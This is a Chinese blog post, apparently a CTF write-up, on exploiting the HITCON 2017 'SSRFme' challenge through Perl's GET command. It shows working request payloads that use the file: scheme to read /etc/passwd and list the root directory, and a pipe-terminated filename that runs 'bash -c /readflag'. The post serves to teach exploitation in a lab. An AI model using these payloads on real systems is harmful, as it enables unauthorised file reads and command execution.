@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>GET命令执行漏洞[HITCON 2017]SSRFme | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">GET命令执行漏洞[HITCON 2017]SSRFme</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p>源码如下<br>
+<img src="https://guokeya.github.io/post-images/1577959882761.png" alt="" loading="lazy"><br>
+分析代码<br>
+1.<br>
+首先就是根据IP。创建个沙盒文件夹</p>
+<!-- more -->
+<p>文件夹名字为md5('orange'+IP)<br>
+2.执行命令<br>
+GET  escapeshellarg($_GET['url'])函数作用是。将我们输入的转换成可以执行在bash执行的命令。比如转移单引号什么的。确保字符串能够被执行<br>
+3.创建文件夹 将我们输入的filename。生成文件夹。这步骤没啥用。只要不输入绝对路径。就不会生成文件夹。所有文件都会在当前沙盒文件夹内</p>
+<pre><code>例如：
+输入/var/www/html/
+会在当前目录创建一个html的文件夹。
+输入1.php
+获取不到路径。就不会创建文件夹
+</code></pre>
+<p>4.将命令执行结果放入filename我们输入1.php<br>
+dir=NULL也就不创建目录。然后将GET命令执行的结果放入1.php<br>
+解题<br>
+第一反应。<br>
+直接命令拼接。放入1.phpc<br>
+<code>http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=%26%26whoami&amp;filename=a</code><br>
+试了所有的命令拼接符。输出到A。都返回400<br>
+<img src="https://guokeya.github.io/post-images/1577960706939.png" alt="" loading="lazy"><br>
+看了writeup才知道。这里是考GET命令执行漏洞<br>
+GET命令类似于CURL。用来发起一个请求。并且支持file协议<br>
+<img src="https://guokeya.github.io/post-images/1577960716867.png" alt="" loading="lazy"><br>
+也就是说。创建一个'whoami|'。然后GET 'file:whoami|'<br>
+就可以执行whoami命令</p>
+<pre><code>http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=&amp;filename=/etc/passwd
+http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=file:/etc/passwd&amp;filename=a
+执行的命令如下：GET file:/etc/passwd &gt;a
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577960736359.png" alt="" loading="lazy"><br>
+读取下根目录文件</p>
+<pre><code>http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=&amp;filename=/
+http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=file:/&amp;filename=a
+GET file:/ &gt;a
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577960762663.png" alt="" loading="lazy"><br>
+根目录下有flag和Readflag<br>
+估计要执行readflag读取flag<br>
+根据上面讲过的执行命令。直接构造bash -c '/readflag'&gt;a就好了</p>
+<pre><code>http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=&amp;filename=bash%20-c%20%27/readflag%27|
+http://487b33dc-4aff-4199-bb76-08e290b9ed70.node3.buuoj.cn/?url=file:bash%20-c%20%27/readflag%27|&amp;filename=a
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1577960787168.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/oIox5MYU2/">
+                  <h3 class="post-title">
+                    Xctf smarty解题思路
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
